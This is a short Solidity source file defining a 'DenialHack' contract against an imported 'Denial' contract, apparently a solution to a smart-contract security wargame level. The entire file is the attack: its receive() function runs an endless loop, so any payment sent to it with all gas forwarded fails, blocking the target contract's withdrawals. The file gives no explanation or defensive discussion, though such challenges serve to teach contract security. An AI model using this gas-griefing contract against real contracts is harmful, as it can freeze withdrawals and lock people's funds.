// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Denial.sol';

contract DenialHack {
    receive() external payable {
        while (true) {}
    }
}
